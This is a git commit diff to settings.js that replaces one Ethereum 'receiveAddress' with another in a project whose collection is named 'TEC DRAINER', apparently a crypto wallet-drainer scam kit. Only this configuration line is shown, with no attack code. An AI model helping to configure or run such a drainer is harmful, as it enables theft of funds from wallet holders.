2688f79497d707ca5ea55c07aa6cc74ab6880ebb
debzii2 <117578702+debzii2@users.noreply.github.com>
2022-11-06 14:49:44 +0100

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = "0x1FD5e3c46085D880840c17813Dd3F36b29EC4081";
+const receiveAddress = "0xE679e0399bD553928Cb366501012ed042CE51082";
 
 const collectionInfo = {
     name: "TEC DRAINER",
